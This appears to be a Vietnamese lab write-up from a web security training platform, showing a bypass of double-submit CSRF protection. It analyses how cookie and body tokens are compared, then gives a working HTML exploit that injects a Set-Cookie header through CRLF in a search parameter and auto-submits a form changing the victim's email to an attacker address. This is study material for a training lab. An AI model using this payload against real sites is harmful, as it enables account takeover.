![[Pasted image 20260928222958.png]]


# 1-phân tích 
![[Pasted image 20260928224847.png]]
-> ban đầu đăng nhập thì ta thấy requests change email như này

-Sau đó ta tiếp tục đăng nhập lại, thì thấy trường csrf ko đổi
-tiếp đó ta xóa trường csrf trên cokkie, thửu request lại
![[Pasted image 20260928224918.png]]
-> kết quả ko được

-khả năng cao là nó dùng csrf ở cả 2 phần cookie và body để check. Ta thử thay csrf=1 ở cả trên và dưới=> kết quả ok thay được email
![[Pasted image 20260928225046.png]]


=> kết luận:
- [ ]  csrf=... này ko đổi , và chả có tác dụng gì trong việc xác minh tính tin cậy của request
- [ ] sever xác thực request này  bằng cách check xem csrf=... có giống nhau ở body và cookie hay ko.==>nếu giống==> pass

# 2-Khai thác
``` html
<html>
  <body>
    <form action="https://0a0900cf034adea5802b35d700a70084.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="csrf" value="1">
    </form>
    <img src="https://0a0900cf034adea5802b35d700a70084.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=1%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
![[Pasted image 20260928224524.png]]